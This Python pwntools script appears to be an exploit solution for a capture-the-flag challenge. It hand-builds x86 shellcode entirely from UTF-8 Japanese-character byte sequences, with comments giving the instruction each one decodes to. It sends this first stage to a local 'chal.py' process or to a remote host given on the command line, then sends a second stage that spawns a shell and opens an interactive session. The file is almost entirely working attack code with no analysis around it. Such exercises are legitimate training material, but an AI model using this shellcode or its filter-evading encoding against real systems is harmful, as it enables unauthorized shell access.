#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

def jpcode():
    # get fix value al = \x91
    payload = '\xe3\x81\x91'                        # nop; xchg eax, ecx
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81'                           # nop
    payload += '\x8b\xef'                           # mov ebp, edi
    payload += '\xbe\x91\xe3\x82\x80'               # mov esi, 0x8082e391
    payload += '\xe3\x81\x95'                       # nop; xchg eax, ebp
    payload += '\xe3\x81\x93'                       # nop; xchg eax, ebx
    payload += '\xe3\x81'                           # nop
    payload += '\x8b\xef'                           # mov ebp, edi
    payload += '\xbe\x91\xe3\x82\x80'               # mov esi, 0x8082e391
    payload += '\xe3\x81\x95'                       # nop; xchg eax, ebp
    payload += '\xe3\x81\xab'                       # nop; stos [edi], eax
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\x96'                       # nop; xchg eax, esi
    payload += '\xe3\x81\xaa'                       # nop; stos [edi], al
    payload += '\xe3\x81\x93'                       # nop; xchg eax, ebx
    payload += '\xe3\x81\x96'                       # nop; xchg eax, esi
    payload += '\xe3\x81\x93'                       # nop; xchg eax, ebx
    payload += '\xe3\x81\xad'                       # nop; lods eax, [esi]

    # create \x91\x93\x97\xcd
    payload += '\xe3\x81\xaf'*2                     # nop; scas eax, [edi]
    payload += '\xe3\x81\xaa'*2                     # nop; stos [edi], al
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xae'*2                     # nop; scas al, [edi]
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaa'                       # nop; stos [edi], al
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaf'                       # nop; scas eax, [edi]
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaa'                       # nop; stos [edi], al
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaf'*12                    # nop; scas eax, [edi]
    payload += '\xe3\x81\xaf'                       # (jecxz from below); scas eax, [edi]
    payload += '\xe3\x81\xae'*2                     # nop; scas al, [edi]
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaa'                       # nop; stos [edi], al

    # create value 3
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaf'*13                    # nop; scas eax, [edi]
    payload += '\xe3\x81\xae'*2                     # nop; scas al, [edi]
    payload += '\xe3\x81\x93'                       # nop; xchg eax, ebx
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\xaa'                       # nop; stos [edi], al
    payload += '\xe3\x81\x94'                       # nop; xchg eax, esp
    payload += '\xe3\x81\xab'                       # nop; stos [edi], eax
    payload += '\xe3\x81\x93'                       # nop; xchg eax, ebx
    payload += '\xe3\x81\xad'                       # nop; lods eax, [esi]

    # jmp to int 0x80
    payload += '\xe3\x81\x97'*8                     # nop; xchg eax, edi // nop
    payload += '\xe3\x81\x97'                       # nop; xchg eax, edi
    payload += '\xe3\x81\x91'                       # nop; xchg eax, ecx
    payload += '\xe3\x81\x93'                       # nop; xchg eax, ebx
    payload += '\xe3\x81\x91'                       # nop; xchg eax, ecx
    payload += '\xe3\x86\x91'                       # (jecxz); don't care
    
    return payload

if __name__ == "__main__":
    payload = jpcode()
    print payload
    print len(payload)

    if len(sys.argv) == 1:
        r = process(['python', 'chal.py'])
    else:
        r = remote(sys.argv[1], sys.argv[2])
    
    r.sendline(payload)
    
    sleep(0.5)
    r.sendline('A'*6 + asm('mov esp, ecx') + asm(shellcraft.sh()))

    r.interactive()
